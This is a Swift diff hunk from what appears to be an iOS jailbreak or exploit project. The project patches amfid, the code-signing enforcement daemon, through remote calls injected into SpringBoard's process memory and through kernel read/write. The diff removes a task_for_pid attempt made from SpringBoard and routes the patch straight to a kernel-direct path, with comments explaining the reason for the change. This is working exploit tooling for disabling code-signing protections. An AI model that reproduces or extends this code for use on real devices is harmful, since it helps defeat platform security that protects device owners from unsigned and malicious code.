@@ -172,33 +172,11 @@ final class ExpAmfidNopFinal {
     
     #if !DISABLE_REMOTECALL
     private func performPatchViaSB(amfidPid: Int32, amfidProc: UInt64) {
-        guard let sb = dspmgr.shared.sbProc else {
-            log("⚠️ No SpringBoard RC — trying launchd...")
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        
-        log("[4/7] task_for_pid(\(amfidPid)) from SpringBoard...")
-        
-        // Try task_for_pid from SpringBoard context
-        let portAddr = sb.trojanMem + 0x100
-        sb[portAddr].setValue32(0)
-        
-        let mts = RootExecutor.rcall(sb, "mach_task_self")
-        let tfpRet = RootExecutor.rcall(sb, "task_for_pid",
-            mts, UInt64(amfidPid), portAddr)
-        let taskPort = sb[portAddr].value32()
-        
-        log("  task_for_pid: ret=\(tfpRet) port=0x\(String(format:"%x", taskPort))")
-        
-        if tfpRet == 0 && taskPort != 0 {
-            log("✅ Got amfid task port from SpringBoard!")
-            doPatchWithTaskPort(rc: sb, taskPort: taskPort, label: "SB")
-        } else {
-            log("❌ SpringBoard task_for_pid failed (ret=\(tfpRet))")
-            log("   Trying kernel direct path...")
-            patchViaKernelDirect(amfidProc: amfidProc, amfidPid: amfidPid)
-        }
+        // NOTE: SpringBoard does NOT have task_for_pid-allow entitlement!
+        // Calling task_for_pid from SB causes exception → respring.
+        // Go directly to kernel path (pure KRW, no RC needed).
+        log("[4/7] Using kernel direct path (safe, no RC needed)...")
+        patchViaKernelDirect(amfidProc: amfidProc, amfidPid: amfidPid)
     }
     
     private func performPatchViaLaunchd(amfidPid: Int32) {
